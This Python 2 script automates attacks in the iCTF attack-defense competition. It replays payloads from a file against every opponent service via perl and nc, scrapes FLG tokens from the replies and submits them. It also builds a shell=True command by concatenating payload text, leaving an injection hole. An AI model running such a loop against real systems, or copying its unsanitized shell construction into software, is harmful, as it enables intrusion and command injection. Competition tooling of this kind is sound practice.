#!/bin/env python

import os
import re
import time
import subprocess32
from ictf import iCTF
from scapy.all import *

# i = iCTF("") TODO: CHANGE ON CTF
# t = i.login("","") TODO: CHANGE ON CTF


while True:
    AD = open("AD.txt", 'r')
    strings = AD.readlines()
    AD.close()

    host = ""
    flagid = ""
    port = ""
    new = ''

    for l in t.get_service_list():
        print "=========="
        for k, v in l.iteritems():
            print k, ": ", v
            if k == "service_id":
                for n in t.get_targets(v)['targets']:
                    #print "    ", n
                    for p, q in n.iteritems():
                        print "    ", p, ": ", q
                        if p == "hostname":
                            host = q
                        if p == "flag_id":
                            flagid = q
                        if p == "port":
                            port = q
                    toolong = False
                    for s in strings:
                        s = s.replace('<<<>>>', flagid)
                        print s
                        try:
                            out = subprocess32.Popen(
                                    'perl -e \'print"' + s + '"\'',
                                    shell=True, stdout=subprocess32.PIPE
                                    )
                            reply = subprocess32.check_output(["nc", host, str(port)], timeout=2, stdin=out.stdout)
                        except subprocess32.TimeoutExpired:
                            toolong = True
                            break
                    if toolong:
                        continue

                    print '+++++++++++++++'
                    flagfound = False
                    for got in  reply.splitlines():
                        print got
                        m = re.search(r'(FLG\w+)', got)
                        if m:
                            print m.group(1)
                            print "Submitting: ",
                            print t.submit_flag([m.group(1)])
                            flagfound = True
                    print '+++++++++++++++'
                    if flagfound:
                        continue
    time.sleep(30)
